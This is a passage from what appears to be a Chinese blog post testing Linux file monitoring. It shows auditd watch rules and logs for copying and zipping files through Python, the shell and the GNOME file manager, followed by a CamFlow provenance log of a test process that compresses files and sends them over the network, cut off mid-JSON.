<li>查看日志：<code>sudo ausearch -i -k pcopy</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : proctitle&#x3D;python copy.py </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : item&#x3D;0 name&#x3D;c.txt inode&#x3D;394656 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:40:48.226:563) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7f79a78244a0 a2&#x3D;O_RDONLY|O_CLOEXEC a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4634 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;python exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3.8 subj&#x3D;unconfined key&#x3D;pcopy</span><br></pre></td></tr></table></figure></li>
<li>*压缩：**</li>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/d.txt -p rwxa -F key=pzip</code></li>
<li>拷贝命令：<code>python zlib.py</code></li>
<li>查看日志：<code>sudo ausearch -i -k pzip</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : proctitle&#x3D;python zlib.py </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : item&#x3D;0 name&#x3D;.&#x2F;d.txt inode&#x3D;394944 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:45:35.582:619) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x7f156444db30 a2&#x3D;O_RDONLY|O_CLOEXEC a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4715 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;python exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;python3.8 subj&#x3D;unconfined key&#x3D;pzip </span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h2><p><strong>拷贝：</strong></p>
<ul>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/e.txt -p rwxa -F key=tcopy</code></li>
<li>拷贝命令：<code>cp e.txt ee.txt</code></li>
<li>查看日志：<code>sudo ausearch -i -k tcopy</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : proctitle&#x3D;cp e.txt ee.txt </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : item&#x3D;0 name&#x3D;e.txt inode&#x3D;396347 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:50:53.861:679) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7ffe0a41f210 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4801 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;cp exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;cp subj&#x3D;unconfined key&#x3D;tcopy </span><br></pre></td></tr></table></figure></li>
<li>*压缩：**</li>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/f.txt -p rwxa -F key=tzip</code></li>
<li>压缩命令：<code>zip f.zip f.txt</code></li>
<li>查看日志：<code>sudo ausearch -i -k tzip</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : proctitle&#x3D;zip f.zip f.txt </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : item&#x3D;0 name&#x3D;f.txt inode&#x3D;396348 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:52:23.556:717) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;4 a0&#x3D;0xffffff9c a1&#x3D;0x55e411b10720 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4861 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;zip exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;zip subj&#x3D;unconfined key&#x3D;tzip </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h2 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h2><p><strong>拷贝：</strong></p>
<ul>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/g.txt -p rwxa -F key=gcopy</code></li>
<li>查看日志：<code>sudo ausearch -i -k gcopy</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;g.txt inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:09.454:862) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;30 a0&#x3D;0xffffff9c a1&#x3D;0x5617b38c29c0 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gcopy </span><br><span class="line">----</span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : item&#x3D;0 name&#x3D;(null) inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:09.454:863) : arch&#x3D;x86_64 syscall&#x3D;flistxattr success&#x3D;yes exit&#x3D;0 a0&#x3D;0x1e a1&#x3D;0x0 a2&#x3D;0x0 a3&#x3D;0x7f42e0002440 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gcopy </span><br><span class="line">----</span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;vmtoolsd -n vmusr --blockFd 3 </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;g.txt inode&#x3D;394598 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:59:10.826:865) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;7 a0&#x3D;0xffffff9c a1&#x3D;0x556fb49c0500 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;2675 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;vmtoolsd exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;vmtoolsd subj&#x3D;unconfined key&#x3D;gcopy</span><br><span class="line"></span><br><span class="line">#其中nautilus nautilus是GNOME桌面下的文件管理工具，vmtoolsd是VMWare Tools的服务</span><br></pre></td></tr></table></figure></li>
<li>*压缩：**</li>
<li>添加规则：<code>sudo auditctl -w /home/supervampire/桌面/C/h.txt -p rwxa -F key=gzip</code></li>
<li>查看日志：<code>sudo ausearch -i -k gzip</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;h.txt inode&#x3D;394616 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 11:02:22.947:905) : arch&#x3D;x86_64 syscall&#x3D;llistxattr success&#x3D;yes exit&#x3D;0 a0&#x3D;0x5617b4151ac0 a1&#x3D;0x0 a2&#x3D;0x0 a3&#x3D;0x5617b3737f10 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gzip </span><br><span class="line">----</span><br><span class="line">type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : proctitle&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus --gapplication-service </span><br><span class="line">type&#x3D;PATH msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : item&#x3D;0 name&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;h.txt inode&#x3D;394616 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 </span><br><span class="line">type&#x3D;CWD msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : cwd&#x3D;&#x2F;home&#x2F;supervampire </span><br><span class="line">type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 11:02:22.951:907) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;31 a0&#x3D;0xffffff9c a1&#x3D;0x5617b4151ac0 a2&#x3D;O_RDONLY a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;1873 pid&#x3D;3183 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;(none) ses&#x3D;3 comm&#x3D;pool-org.gnome. exe&#x3D;&#x2F;usr&#x2F;bin&#x2F;nautilus subj&#x3D;unconfined key&#x3D;gzip</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
</br>
</br>
</br>
</br>
</br>
</br>
</br>

<h1 id="Camflow测试"><a href="#Camflow测试" class="headerlink" title="Camflow测试"></a>Camflow测试</h1><ul>
<li>测试目标：进程(搜索，压缩，发送)</li>
<li>测试环境：Python脚本</li>
<li><a href="https://wxt123.top/dict/CamFlow/camflow.py.txt">测试脚本源码地址链接</a></li>
</ul>
<hr>
<ul>
<li>添加规则：<code>sudo camflow --track-process 2311 true</code></li>
<li>查看日志：<code>cat /tmp/audit.log</code>(由于日志太长，只截取其中一段的关键部分，该段包含关键文件名和packet信息，<a href="https://wxt123.top/dict/CamFlow/cc/readme.txt">全部日志链接访问</a>)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;entity&quot;: &#123;</span><br><span class="line">		&quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;142976&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;socket&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 0,</span><br><span class="line">			&quot;cf:gid&quot;: 0,</span><br><span class="line">			&quot;cf:mode&quot;: &quot;0xc1ff&quot;,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;,</span><br><span class="line">			&quot;cf:ino&quot;: 56422,</span><br><span class="line">			&quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[socket] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAACAAAAACAVIQAAwKi3gi9dKpaxXAAWBgAAAGi29KA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: 8469,</span><br><span class="line">			&quot;cf:seq&quot;: 2700392040,</span><br><span class="line">			&quot;cf:sender&quot;: &quot;192.168.183.130:45404&quot;,</span><br><span class="line">			&quot;cf:receiver&quot;: &quot;47.93.42.150:22&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;packet&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963341&quot;,</span><br><span class="line">			&quot;cf:len&quot;: 15360,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[packet] 192.168.183.130:45404-&gt;47.93.42.150:22 (8469)&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFQAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;140860&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;process_memory&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 21,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963379&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 1000,</span><br><span class="line">			&quot;cf:gid&quot;: 1000,</span><br><span class="line">			&quot;cf:tgid&quot;: 2341,</span><br><span class="line">			&quot;cf:utsns&quot;: 4026531838,</span><br><span class="line">			&quot;cf:ipcns&quot;: 4026531839,</span><br><span class="line">			&quot;cf:mntns&quot;: 4026531840,</span><br><span class="line">			&quot;cf:pidns&quot;: 4026531836,</span><br><span class="line">			&quot;cf:netns&quot;: 4026531992,</span><br><span class="line">			&quot;cf:cgroupns&quot;: 4026531835,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[process] 21&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;50755&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;file&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963462&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:uid&quot;: 0,</span><br><span class="line">			&quot;cf:gid&quot;: 0,</span><br><span class="line">			&quot;cf:mode&quot;: &quot;0x81a4&quot;,</span><br><span class="line">			&quot;cf:secctx&quot;: &quot;unconfined_u:object_r:ld_so_cache_t:s0&quot;,</span><br><span class="line">			&quot;cf:ino&quot;: 322674,</span><br><span class="line">			&quot;cf:uuid&quot;: &quot;90365732-09d3-477e-bf09-6e627d11b666&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[file] 0&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACThul9E+DhrUCgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;5794787984492444385&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;python3.9&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;python3.9&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACQLciqz2yQUOygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;4257068073794302475&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;flag.txt&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;flag.txt&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACTUxo1ZkB2e5ygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;16689809774896596692&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;c.txt&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;c.txt&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACRjBXZwWD6wUCgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;5814215668500137315&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;camflow.py&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;camflow.py&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACQKWd+Om89h2ygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;15808144434071034122&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;cc.zip&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;cc.zip&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACQijbO7AsObRygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;5159932214589492514&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span class="line">			&quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;a.txt&quot;,</span><br><span class="line">			&quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;Camflow-test&#x2F;A&#x2F;a.txt&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">		&quot;cf:AABAAAAAACSjpcW7AsObRygAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123;</span><br><span class="line">			&quot;cf:id&quot;: &quot;5159932214590678435&quot;,</span><br><span class="line">			&quot;prov:type&quot;: &quot;path&quot;,</span><br><span class="line">			&quot;cf:boot_id&quot;: 40,</span><br><span class="line">			&quot;cf:machine_id&quot;: &quot;cf:109627812&quot;,</span><br><span class="line">			&quot;cf:version&quot;: 0,</span><br><span class="line">			&quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;,</span><br><span class="line">			&quot;cf:taint&quot;: &quot;0&quot;,</span><br><span class="line">			&quot;cf:jiffies&quot;: &quot;4294963336&quot;,</span><br><span class="line">			&quot;cf:epoch&quot;: 2,</span><br><span 